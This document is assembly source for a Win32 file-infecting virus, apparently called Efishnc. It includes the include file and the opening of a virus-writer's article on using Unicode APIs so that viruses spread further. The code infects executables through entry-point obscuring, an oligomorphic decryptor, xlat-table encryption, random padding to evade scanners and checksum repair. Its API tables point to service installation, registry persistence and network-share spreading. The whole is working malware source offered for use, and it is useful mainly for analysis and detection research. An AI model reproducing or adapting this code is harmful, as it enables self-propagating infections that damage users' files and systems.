;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

        and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        jne     inftest_ret                     ;cannot use xor+jpo because 0 is also jpe

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        add     esi, pehdr.pesubsys - pehdr.pecoff.petimedate
        lods    dword ptr [esi]
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
        jnbe    inftest_ret
        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
        jb      inftest_ret
        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
        jb      inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pestackmax], 0
        jne     inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pestackmax]
        add     eax, edx
        lea     esi, dword ptr [esi + eax - pehdr.pestackmax + pehdr.pemagic - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        add     eax, dword ptr [esi]
        cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
        jne     inftest_ret                     ;file contains appended data
        call    find_epo
        sbb     dword ptr [esp + mapsehstk.mapsehinfret], -1
                                                ;skip call mask

inftest_ret     label   near
        int     3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append     proc    near
        push    (krncrcstk.kGetTickCount - krncrcstk.klstrlenW) shr 2
        pop     eax
        call    store_krnapi
        and     eax, RANDPADMAX - 1
        add     ax, small (grbgsize + tblsize + grbgsize + vsize + randsize + grbgsize + RANDPADMIN)

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi -> findlist, ebp -> platform APIs
        add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
        xor     ecx, ecx
        push    eax
        push    eax                             ;MapViewOfFile
        push    ecx                             ;MapViewOfFile
        push    ecx                             ;MapViewOfFile
        push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
        push    ecx
        push    eax
        push    ecx
        push    PAGE_READWRITE
        push    ecx
        push    ebx
        push    (krncrcstk.kCreateFileMappingA - krncrcstk.klstrlenW) shr 2
        pop     eax                             ;ANSI map is allowed because of no name
        call    store_krnapi
        push    eax
        xchg    edi, eax
        push    (krncrcstk.kMapViewOfFile - krncrcstk.klstrlenW) shr 2
        pop     eax
        call    store_krnapi
        pop     ecx
        xchg    edi, eax                        ;should succeed even if file cannot be opened
        pushad
        call    unmap_seh
        mov     esp, dword ptr [esp + sehstruc.sehprevseh]
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad                                   ;SEH destroys all registers
        push    eax
        push    edi
        push    (krncrcstk.kUnmapViewOfFile - krncrcstk.klstrlenW) shr 2
        pop     eax
        call    store_krnapi
        call    cCloseHandle
        pop     eax
        ret

unmap_seh       proc    near
        cdq
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        jmp     dword ptr [esp + mapsehstk.mapsehsehret]
unmap_seh       endp
map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
open_append     endp

;-----------------------------------------------------------------------------
;search first section for stack frame bytes that are large enough to hold code
;-----------------------------------------------------------------------------

find_epo        proc    near                    ;edi = map view
        mov     edx, edi
        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
        movzx   eax, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
        lea     esi, dword ptr [ebx + eax + pehdr.pemagic - pehdr.pechksum + pesect.sectrawsize]
        lods    dword ptr [esi]
        sub     eax, decsize
        jbe     epo_fail
        xchg    ecx, eax
        lods    dword ptr [esi]
        add     edi, eax

find_enter      label   near
        mov     al, 55h                         ;push ebp
        repne   scas byte ptr [edi]
        jne     epo_fail
        mov     eax, dword ptr [edi]
        cmp     ax, 0e589h                      ;mov ebp, esp
        je      find_leave
        cmp     ax, 0ec8bh                      ;mov ebp, esp
        jne     find_enter

find_leave      label   near
        push    ecx
        push    edi
        mov     al, 5dh                         ;pop ebp
        repne   scas byte ptr [edi]
        xchg    edi, eax
        pop     edi
        pop     ecx
        jne     find_enter
        sub     eax, edi
        cmp     eax, decsize - 1
        jb      find_enter
        mov     eax, dword ptr [edi + eax - 3]
        cmp     ax, 0ec89h                      ;mov esp, ebp
        je      found_leave
        cmp     ax, 0e58bh                      ;mov esp, ebp
        jne     find_enter

found_leave     label   near
        dec     edi
        push    edi
        sub     edi, edx
        sub     edi, dword ptr [esi + pesect.sectrawaddr - pesect.sectreladdr]
        add     edi, dword ptr [esi + pesect.sectvirtaddr - pesect.sectreladdr]
        add     edi, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
        pop     esi
        mov     al, 'r'                         ;mask STC
        org     $ - 1
epo_fail        label   near
        stc

epo_ret         label   near
        xchg    edi, eax
        ret                                     ;eax = virtual address, esi = map offset
find_epo        endp

;-----------------------------------------------------------------------------
;determine platform and dynamically select function types (ANSI or Unicode)
;-----------------------------------------------------------------------------

get_krnapis     proc    near                    ;place near to jump table for smaller code
        call    cGetVersion

krnapi_delta    label   near
        shr     eax, 1fh
        mov     ecx, dword ptr [esp - 4]        ;no stack change in ring 3
        mov     ecx, dword ptr [ecx + offset store_krnapi - offset krnapi_delta + 3]
        lea     ebp, dword ptr [eax * 4 + ecx]
        ret
get_krnapis     endp

;-----------------------------------------------------------------------------
;indexed API jump table
;-----------------------------------------------------------------------------

clstrcatW               proc    near
        push    (krncrcstk.klstrcatW - krncrcstk.klstrlenW) shr 2
        jmp     call_krncrc
clstrcatW               endp

cSleep                  proc    near
        push    (krncrcstk.kSleep - krncrcstk.klstrlenW) shr 2
        jmp     call_krncrc
cSleep                  endp

cSetCurrentDirectoryA   proc    near
        push    (krncrcstk.kSetCurrentDirectoryA - krncrcstk.klstrlenW) shr 2
        jmp     call_krncrc
cSetCurrentDirectoryA   endp

cLoadLibraryA           proc    near
        push    (krncrcstk.kLoadLibraryA - krncrcstk.klstrlenW) shr 2
        jmp     call_krncrc
cLoadLibraryA           endp

cGlobalFree             proc    near
        push    (krncrcstk.kGlobalFree - krncrcstk.klstrlenW) shr 2
        jmp     call_krncrc
cGlobalFree             endp

cGlobalAlloc            proc    near
        push    (krncrcstk.kGlobalAlloc - krncrcstk.klstrlenW) shr 2
        jmp     call_krncrc
cGlobalAlloc            endp

cGetVersion             proc    near
        push    (krncrcstk.kGetVersion - krncrcstk.klstrlenW) shr 2
        jmp     call_krncrc
cGetVersion             endp

cCreateThread           proc    near
        push    (krncrcstk.kCreateThread - krncrcstk.klstrlenW) shr 2
        jmp     call_krncrc
cCreateThread           endp

cCloseHandle            proc    near
        push    (krncrcstk.kCloseHandle - krncrcstk.klstrlenW) shr 2
cCloseHandle            endp

call_krncrc     proc    near
        pop     eax

store_krnapi    label   near
        jmp     dword ptr [eax * 4 + '!bgr']
call_krncrc     endp

;-----------------------------------------------------------------------------
;infect file using entry point obscured way and variable encryption
;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
;               bytes) to confuse scanners that look at end of file (also
;               infection marker)
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and garbage or many zeroes)
;               entry point is not altered.  search instead for stack frame
;               (push ebp+mov ebp, esp) with end (mov esp, ebp+pop ebp) at
;               least as large as decryptor then save bytes and overwrite with
;               small oligomorphic decryptor and body is encrypted using xlat
;               table so is like having 256 keys
;               variable number of garbage bytes placed on both sides of body
;-----------------------------------------------------------------------------

infect_file     label   near                    ;esi -> findlist, edi = map view
        call    open_append

delta_label     label   near
        push    ecx
        push    edi
        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
        movzx   eax, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum]
        imul    eax, eax, size pesect
        movzx   ecx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
        add     eax, ecx
        lea     esi, dword ptr [ebx + eax + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        mov     cx, grbgsize + tblsize + grbgsize + vsize + randsize + grbgsize
        mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
        push    eax
        add     eax, ecx
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx                        ;file align last section
        mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        jnb     test_reloff
        mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        add     eax, ebp
        mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx
        mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff     label   near
        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        jne     copy_code
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
        jb      copy_code
        mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
        add     eax, ebp
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
        jnb     copy_code
        add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
        pop     eax
        push    esi
        add     edi, dword ptr [esi]
        lea     esi, dword ptr [edi + eax - 1]
        lea     edi, dword ptr [esi + ecx]
        xchg    ecx, eax
        std
        rep     movs byte ptr [edi], byte ptr [esi]
        cld
        pop     esi
        pop     edi
        push    edi
        push    ecx
        xchg    ecx, eax

copy_code       label   near
        pop     edx
        add     ebp, edx
        xchg    ebp, eax
        add     edx, dword ptr [esi]
        add     edi, edx
        pop     eax
        push    eax
        push    ecx
        push    edi
        push    esi
        xchg    edi, eax
        call    find_epo
        push    decsize
        pop     ecx
        mov     edi, offset orgbytes - offset delta_label
        add     edi, dword ptr [esp + infectstk.infseh.mapsehsehret]
                                                ;delta offset
        push    ecx
        push    esi
        rep     movs byte ptr [edi], byte ptr [esi]
        inc     edi
        stos    dword ptr [edi]                 ;store_restore
        pop     edi
        pop     ecx
        pop     esi
        pop     eax
        push    eax
        sub     eax, dword ptr [esi]
        add     eax, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]

store_copysrc   label   near
        mov     esi, '!bgr'
        sub     eax, edx
        sub     eax, esi
        add     eax, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]

store_baseptr   label   near
        mov     edx, '!bgr'
        inc     edx
        add     eax, dword ptr [edx]
        xchg    dword ptr [edx], eax
        push    esi

store_decsrc    label   near
        mov     esi, '!bgr'
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     dword ptr [edx], eax
        push    ebx
        mov     ebx, esi
        mov     cx, offset efishnc_codeend - offset efishnc_inf
        mov     esi, offset efishnc_inf - offset delta_label
        add     esi, dword ptr [esp + 4 + infectstk.infseh.mapsehsehret]
                                                ;delta offset

store_encdst    label   near
        mov     edi, '!bgr'

xlat_encrypt    label   near
        lods    byte ptr [esi]
        xlat    byte ptr [ebx]
        stos    byte ptr [edi]
        loop    xlat_encrypt
        pop     ebx
        pop     esi
        pop     edi
        pop     ecx
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     edi

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xchg    dword ptr [ebx], ecx
        jecxz   infect_ret
        xor     eax, eax
        pop     ecx
        push    ecx
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum   label   near
        adc     ax, word ptr [edi]
        inc     edi
        inc     edi
        loop    calc_checksum
        pop     dword ptr [ebx]
        adc     dword ptr [ebx], eax            ;avoid common bug.  ADC not ADD

infect_ret      label   near
        int     3                               ;common exit using SEH
        db      "*4U2NV*"                       ;that is, unless you're reading this
test_infect     endp

regdll  db      "advapi32", 0                   ;place < 80h bytes from end for smaller code

efishnc_codeend label   near
efishnc_inf     endp
end             dropper
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[EFISHNC.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[EFISHNC.INC]컴�
MAX_PATH                        equ     260

FILE_ATTRIBUTE_HIDDEN           equ     00000002h
FILE_ATTRIBUTE_DIRECTORY        equ     00000010h
FILE_ATTRIBUTE_NORMAL           equ     00000080h
FILE_FLAG_RANDOM_ACCESS         equ     10000000h

CREATE_ALWAYS                   equ     2
OPEN_EXISTING                   equ     3

GENERIC_WRITE                   equ     40000000h
GENERIC_READ                    equ     80000000h

GMEM_FIXED                      equ     0
GMEM_ZEROINIT                   equ     40h

REG_SZ                          equ     1

HKEY_CURRENT_USER               equ     80000001h
HKEY_LOCAL_MACHINE              equ     80000002h
HKEY_USERS                      equ     80000003h

SC_MANAGER_CREATE_SERVICE       equ     2

SERVICE_START                   equ     10h
SERVICE_WIN32_OWN_PROCESS       equ     10h
SERVICE_AUTO_START              equ     2

DRIVE_FIXED                     equ     3
DRIVE_REMOTE                    equ     4

IMAGE_FILE_MACHINE_I386         equ     14ch    ;14d/14e do not exist.  if you don't believe, then try it

IMAGE_FILE_RELOCS_STRIPPED      equ     0001h
IMAGE_FILE_EXECUTABLE_IMAGE     equ     0002h
IMAGE_FILE_32BIT_MACHINE        equ     0100h
IMAGE_FILE_SYSTEM               equ     1000h
IMAGE_FILE_DLL                  equ     2000h
IMAGE_FILE_UP_SYSTEM_ONLY       equ     4000h

IMAGE_SUBSYSTEM_WINDOWS_GUI     equ     2
IMAGE_SUBSYSTEM_WINDOWS_CUI     equ     3

SECTION_MAP_WRITE               equ     0002h

FILE_MAP_WRITE                  equ     SECTION_MAP_WRITE

PAGE_READWRITE                  equ     04

RANDPADMIN                      equ     4096
RANDPADMAX                      equ     2048 ;RANDPADMIN is added to this

RESOURCE_GLOBALNET              equ     2

RESOURCETYPE_DISK               equ     00000001

ERROR_MORE_DATA                 equ     234

RESOURCEUSAGE_CONNECTABLE       equ     00000001
RESOURCEUSAGE_CONTAINER         equ     00000002

MAX_PREFERRED_LENGTH            equ     0ffffffffh
LM20_NNLEN                      equ     12

statelen                        equ     624
period                          equ     397

tshiftU                         equ     0bh
tshiftS                         equ     7
tmaskB                          equ     9d2c5680h
tshiftT                         equ     0fh
tmaskC                          equ     0efc60000h
tshiftL                         equ     12h
matrixA                         equ     9908b0dfh

grbgsize                        equ     8192    ;power of 2
tblsize                         equ     256     ;fixed (xlat table)
randsize                        equ     4096    ;power of 2, vsize + randsize must be < 8192, else stack fault

;so: grbgsize garbage, table, grbgsize garbage, buffer, randsize garbage
;or: grbgsize garbage, buffer, randsize garbage, table, grbgsize garbage

decsize                         equ     20h     ;very small :) must be >= 20h

;global state
state_decdown                   equ     1       ;else up
state_esifirst                  equ     2       ;else ebx first
state_pushret                   equ     4       ;else jmp esp
state_pushb                     equ     8       ;push at begin else push at end
state_movesi                    equ     10h     ;else lodsb
state_movedi                    equ     20h     ;else stosb
state_jg                        equ     40h     ;jl(e)/jb(e) else jg(e)/jnb(e)

;block 1 state                                  ;log2, not bit value
state_loadebx                   equ     0       ;hard-coded
state_loadesi                   equ     1
state_entered                   equ     2
state_loadedi                   equ     3
state_std                       equ     4
state_pushreg1                  equ     5

block1and                       equ     7
block1cmp                       equ     6
block1done                      equ     (1 shl state_loadebx) or (1 shl state_loadesi) or (1 shl state_entered) \
                                        or (1 shl state_loadedi) or (1 shl state_std) or (1 shl state_pushreg1)

;block 2 state
state_lods                      equ     0
state_xlat                      equ     1
state_stos                      equ     2
state_incesi                    equ     3
state_incedi                    equ     4
state_cmp                       equ     5
state_branch                    equ     6
state_pushreg2                  equ     7       ;hard-coded
state_ret                       equ     1       ;state_esifirst overloaded

block2and                       equ     0fh
block2cmp                       equ     9

vsize                           equ     (offset efishnc_codeend - offset efishnc_inf + 3) and -4

align           1                               ;byte-packed structures
expcrcstk       struct
        pWriteProcessMemory     dd      ?
        pWriteFile              dd      ?
        pWinExec                dd      ?
        pSetFileAttributesA     dd      ?
        pMoveFileA              dd      ?
        pLoadLibraryA           dd      ?
        pGlobalFree             dd      ?
        pGlobalAlloc            dd      ?
        pGetWindowsDirectoryA   dd      ?
        pGetTickCount           dd      ?
        pGetTempFileNameA       dd      ?
        pGetFileAttributesA     dd      ?
        pGetCurrentProcess      dd      ?
        pDeleteFileA            dd      ?
        pCreateFileA            dd      ?
        pCloseHandle            dd      ?
expcrcstk       ends
expcrc_count    equ     size expcrcstk shr 2

regcrcstk       struct
        rRegSetValueA           dd      ?
        rRegCreateKeyA          dd      ?
        rRegCloseKey            dd      ?
        rOpenSCManagerA         dd      ?
        rCreateServiceA         dd      ?
        rCloseServiceHandle     dd      ?
regcrcstk       ends
regcrc_count    equ     size regcrcstk shr 2

popsize         equ     0ch + size regcrcstk + size expcrcstk

execrcstk       struct
        eLoadLibraryA           dd      ?
        eGlobalAlloc            dd      ?
        eGetVersion             dd      ?
        eGetTickCount           dd      ?
        eGetStartupInfoW        dd      ?
        eGetStartupInfoA        dd      ?
        eGetCommandLineW        dd      ?
        eGetCommandLineA        dd      ?
        eExitProcess            dd      ?
        eCreateProcessW         dd      ?
        eCreateProcessA         dd      ?
execrcstk       ends
execrc_count    equ     size execrcstk shr 2

usrcrcstk       struct
        uCharNextW      dd      ?
        uCharNextA      dd      ?
usrcrcstk       ends
usrcrc_count    equ     size usrcrcstk shr 2

svccrcstk       struct
        sStartServiceCtrlDispatcherA    dd      ?
svccrcstk       ends
svccrc_count    equ     size svccrcstk shr 2

startupinfo     struct
        sicb                    dd      ?
        siReserved              dd      ?
        siDesktop               dd      ?
        siTitle                 dd      ?
        sidwX                   dd      ?
        sidwY                   dd      ?
        sidwXSize               dd      ?
        sidwYSize               dd      ?
        sidwXCountChars         dd      ?
        sidwYCountChars         dd      ?
        sidwFillAttribute       dd      ?
        sidwFlags               dd      ?
        siwShowWindow           dw      ?
        sicbReserved2           dw      ?
        silpReserved2           dd      ?
        sihStdInput             dd      ?
        sihStdOutput            dd      ?
        sihStdError             dd      ?
startupinfo     ends

processinfo     struct
        pihProcess      dd      ?
        pihThread       dd      ?
        pidwProcessId   dd      ?
        pidwThreadId    dd      ?
processinfo     ends

krncrcstk       struct
        klstrlenW               dd      ?
        klstrcpyW               dd      ?
        klstrcatW               dd      ?
        kUnmapViewOfFile        dd      ?
        kSleep                  dd      ?
        kSetFileTime            dd      ?
        kSetFileAttributesW     dd      ?
        kSetFileAttributesA     dd      ?
        kSetCurrentDirectoryW   dd      ?
        kSetCurrentDirectoryA   dd      ?
        kMultiByteToWideChar    dd      ?
        kMapViewOfFile          dd      ?
        kLoadLibraryA           dd      ?
        kGlobalFree             dd      ?
        kGlobalAlloc            dd      ?
        kGetVersion             dd      ?
        kGetTickCount           dd      ?
        kGetFullPathNameW       dd      ?
        kGetFullPathNameA       dd      ?
        kGetDriveTypeA          dd      ?
        kFindNextFileW          dd      ?
        kFindNextFileA          dd      ?
        kFindFirstFileW         dd      ?
        kFindFirstFileA         dd      ?
        kFindClose              dd      ?
        kCreateThread           dd      ?
        kCreateFileMappingA     dd      ?
        kCreateFileW            dd      ?
        kCreateFileA            dd      ?
        kCloseHandle            dd      ?
krncrcstk       ends
krncrc_count    equ     size krncrcstk shr 2

sfccrcstk       struct
        sSfcIsFileProtected     dd      ?
sfccrcstk       ends
sfccrc_count    equ     size sfccrcstk shr 2

netcrcstk       struct
        nWNetOpenEnumW          dd      ?
        nWNetOpenEnumA          dd      ?
        nWNetEnumResourceW      dd      ?
        nWNetEnumResourceA      dd      ?
        nWNetCloseEnum          dd      ?
netcrcstk       ends
netcrc_count    equ     size netcrcstk shr 2

ip9xcrcstk      struct
        ip9xNetShareEnum        dd      ?
ip9xcrcstk      ends
ip9xcrc_count   equ     size ip9xcrcstk shr 2

ipntcrcstk      struct
        ipntNetShareEnum        dd      ?
        ipntNetApiBufferFree    dd      ?
ipntcrcstk      ends
ipntcrc_count   equ     size ipntcrcstk shr 2

coffhdr         struct
        pemachine       dw      ?               ;04
        pesectcount     dw      ?               ;06
        petimedate      dd      ?               ;08
        pesymbrva       dd      ?               ;0C
        pesymbcount     dd      ?               ;10
        peopthdrsize    dw      ?               ;14
        peflags         dw      ?               ;16
coffhdr         ends

pedir           struct
        dirrva          dd      ?
        dirsize         dd      ?
pedir           ends

pehdr           struct
        pesig           dd      ?               ;00
        pecoff          coffhdr <?>
        pemagic         dw      ?               ;18
        pemajorlink     db      ?               ;1A
        peminorlink     db      ?               ;1B
        pecodesize      dd      ?               ;1C
        peidatasize     dd      ?               ;20
        peudatasize     dd      ?               ;24
        peentrypoint    dd      ?               ;28
        pecodebase      dd      ?               ;2C
        pedatabase      dd      ?               ;30
        peimagebase     dd      ?               ;34
        pesectalign     dd      ?               ;38
        pefilealign     dd      ?               ;3C
        pemajoros       dw      ?               ;40
        peminoros       dw      ?               ;42
        pemajorimage    dw      ?               ;44
        peminorimage    dw      ?               ;46
        pemajorsubsys   dw      ?               ;48
        peminorsubsys   dw      ?               ;4A
        pereserved      dd      ?               ;4C
        peimagesize     dd      ?               ;50
        pehdrsize       dd      ?               ;54
        pechksum        dd      ?               ;58
        pesubsys        dw      ?               ;5C
        pedllflags      dw      ?               ;5E
        pestackmax      dd      ?               ;60
        pestacksize     dd      ?               ;64
        peheapmax       dd      ?               ;68
        peheapsize      dd      ?               ;6C
        peldrflags      dd      ?               ;70
        pervacount      dd      ?               ;74
        peexport        pedir   <?>             ;78
        peimport        pedir   <?>             ;80
        persrc          pedir   <?>             ;88
        peexcpt         pedir   <?>             ;90
        pesecurity      pedir   <?>             ;98
        pereloc         pedir   <?>             ;A0
        pedebug         pedir   <?>             ;A8
        pearch          pedir   <?>             ;B0
        peglobal        pedir   <?>             ;B8
        petls           pedir   <?>             ;C0
        peconfig        pedir   <?>             ;C8
        pebound         pedir   <?>             ;D0
        peiat           pedir   <?>             ;D8
        pedelay         pedir   <?>             ;E0
        pecom           pedir   <?>             ;E8
        persrv          pedir   <?>             ;F0
pehdr           ends

peexp           struct
        expflags        dd      ?
        expdatetime     dd      ?
        expmajorver     dw      ?
        expminorver     dw      ?
        expdllrva       dd      ?
        expordbase      dd      ?
        expadrcount     dd      ?
        expnamecount    dd      ?
        expadrrva       dd      ?
        expnamerva      dd      ?
        expordrva       dd      ?
peexp           ends

mzhdr           struct
        mzsig           dw      ?               ;00
        mzpagemod       dw      ?               ;02
        mzpagediv       dw      ?               ;04
        mzrelocs        dw      ?               ;06
        mzhdrsize       dw      ?               ;08
        mzminalloc      dw      ?               ;0A
        mzmaxalloc      dw      ?               ;0C
        mzss            dw      ?               ;0E
        mzsp            dw      ?               ;10
        mzchksum        dw      ?               ;12
        mzip            dw      ?               ;14
        mzcs            dw      ?               ;16
        mzreloff        dw      ?               ;18
        mzfiller        db      22h dup (?)     ;1A
        mzlfanew        dd      ?               ;3C
mzhdr   ends

tib             struct
        ExceptReg       dd      ?
        StackBase       dd      ?
        StackLimit      dd      ?
        SubSystem       dd      ?
        FiberData       dd      ?
        UserPointer     dd      ?
        TibSelf         dd      ?
        TibUnknown      dd      5 dup (?)
        TibTeb          dd      ?
tib             ends

teb             struct
        tebUnknown      dd      6 dup (?)
        heaphand        dd      ?
        tebUnknown2     dd      ?
        procflags       dd      ?
teb             ends

FILETIME        struct
        dwLowDateTime   dd      ?
        dwHighDateTime  dd      ?
FILETIME        ends

WIN32_FIND_DATA struct
        dwFileAttributes        dd              ?
        ftCreationTime          FILETIME        <?>
        ftLastAccessTime        FILETIME        <?>
        ftLastWriteTime         FILETIME        <?>
        dwFileSizeHigh          dd              ?
        dwFileSizeLow           dd              ?
        dwReserved0             dd              ?
        dwReserved1             dd              ?
        cFileName               dw              260 dup (?)
        cAlternateFileName      dw              14 dup (?)
WIN32_FIND_DATA ends

findlist        struct
        findprev        dd                      ?
        findhand        dd                      ?
        finddata        WIN32_FIND_DATA         <?>
findlist        ends

sehstruc        struct
        sehkrnlret      dd      ?
        sehexcptrec     dd      ?
        sehprevseh      dd      ?
sehstruc        ends

pesect          struct
        sectname        db      8 dup (?)
        sectvirtsize    dd      ?
        sectvirtaddr    dd      ?
        sectrawsize     dd      ?
        sectrawaddr     dd      ?
        sectreladdr     dd      ?
        sectlineaddr    dd      ?
        sectrelcount    dw      ?
        sectlinecount   dw      ?
        sectflags       dd      ?
pesect          ends

mapsehstk       struct
        mapsehprev      dd      ?
        mapsehexcpt     dd      ?
        mapsehregs      dd      8 dup (?)
        mapsehsehret    dd      ?
        mapsehinfret    dd      ?
mapsehstk       ends

mapstack        struct
        mapfilesize     dd      ?
        mapmapret       dd      ?
        mapinfret       dd      ?
        mapattrib       dd      ?
mapstack        ends

infectstk       struct
        infcopysrc      dd              ?
        infcopydst      dd              ?
        infcopysize     dd              ?
        infmapview      dd              ?
        inffilesize     dd              ?
        infseh          mapsehstk       <?>
infectstk       ends

NETRESOURCE     struct
        dwScope         dd      ?
        dwType          dd      ?
        dwDisplayType   dd      ?
        dwUsage         dd      ?
        lpLocalName     dd      ?
        lpRemoteName    dd      ?
        lpComment       dd      ?
        lpProvider      dd      ?
NETRESOURCE     ends

wnetlist        struct
        wnetprev        dd      ?
        wnethand        dd      ?
wnetlist        ends

SERVICE_TABLE_ENTRY     struct
        lpServiceName   dd      ?
        lpServiceProc   dd      ?
        lpServiceName0  dd      ?
        lpServiceProc0  dd      ?
SERVICE_TABLE_ENTRY     ends

share_info_1nt  struct
        shi1_netnament          dd      ?
        shi1_typent             dd      ?
        shi1_remarknt           dd      ?
share_info_1nt  ends

share_info_19x  struct
        shi1_netname9x          db      LM20_NNLEN + 1 dup (?)
        shi1_pad1               db      ?
        shi1_type9x             dw      ?
        shi1_remark9x           dd      ?
share_info_19x  ends

align                                           ;restore default alignment
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[EFISHNC.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[UNICODE.TXT]컴�
                                United Nations
                               ANSI and Unicode
                              roy g biv / defjam

                                 -= defjam =-
                                  since 1992
                     bringing you the viruses of tomorrow
                                    today!


About the author:

Former  DOS/Win16  virus writer, author of several virus  families,  including
Ginger  (see Coderz #1 zine for terrible buggy example, contact me for  better
sources  ;),  and  Virus Bulletin 9/95 for a description of what  they  called
Rainbow.   Co-author  of  world's first virus using circular  partition  trick
(Orsam,  coded  with  Prototype in 1993).  Designer of the world's  first  XMS
swapping  virus (John Galt, coded by RTFishel in 1995, only 30 bytes stub, the
rest  is  swapped  out).   Author of world's first virus  using  Thread  Local
Storage  for  replication  (Shrug) and world's first Native  executable  virus
(Chthon).   Author  of  various retrovirus articles (eg see Vlad  #7  for  the
strings  that make your code invisible to TBScan).  Went to sleep for a number
of years.  This is my fourth virus for Win32.

I'm also available for joining a group.  Just in case anyone is interested. ;)


What is Unicode?

Unicode  is  a  standard for character set encoding that  supports  many  more
characters than ANSI character set does, and without needing any code pages.


Sounds great, but why should I care?

For  the languages that cannot be supported properly by the ANSI character set
(eg  Arabic  and  Hebrew), directories and files can be created that  no  ANSI
function can access.  Also, no ANSI function can calculate even a simple thing
like  string length of a DBCS text unless the language is known.  In  Unicode,
none of these things is a problem... except that Windows 9x/Me has only little
Unicode support, even if the Microsoft Layer for Unicode is used (because MSLU
relies  on code pages).  This means that a virus cannot spread as far  because
it  relies  on APIs that are limited.  As people move to Windows XP and  other
NT-based  operating systems and Asian languages become the most widely used in
the computer world, this becomes even more important for us.


So the problem is...

We  want  to  use  ANSI functions where we must (Windows  9x/Me)  and  Unicode
functions where we can (Windows NT/2000/XP), all without duplicating code.


And the solution?

Group  together the address of functions and use indexed calls to access them.
When combined with some small support code, transparent support is easy.


Example that finds arguments on command-line in platform-independent way:

;esp -> CharNextW, CharNextA, GetCommandLineW, GetCommandLineA
call    GetVersion
